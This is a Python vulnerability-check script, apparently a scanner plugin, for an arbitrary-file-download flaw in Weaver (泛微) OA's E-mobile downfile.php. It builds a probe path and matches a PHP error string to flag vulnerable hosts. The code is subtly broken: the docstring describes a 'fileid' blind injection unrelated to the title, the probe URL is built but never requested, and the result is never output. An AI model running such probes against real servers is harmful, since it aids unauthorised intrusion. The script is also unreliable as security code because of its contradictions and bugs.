#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 泛微OA downfile.php 任意文件下载漏洞
referer: 
author: Lucifer
description: fileid参数引起的布尔盲注。
'''
import re
import sys
import requests
import warnings



class filedownload:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['泛微OA downfile.php 任意文件下载漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/E-mobile/Data/downfile.php?url=123"
        vulnurl = self.url + payload
        try:
            req = requests.get(self.url, headers=headers, timeout=10, verify=False)
            if req.status_code == 200:
                m = re.search(r'No error in <b>([^<]+)</b>', req.text)
                if m:
                    result[2]=  '存在'
                    result[1] =self.url
                else:
                    result[2]=  '不存在'

        except:
            result[2]='未知'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = filedownload(sys.argv[1])
    testVuln.run()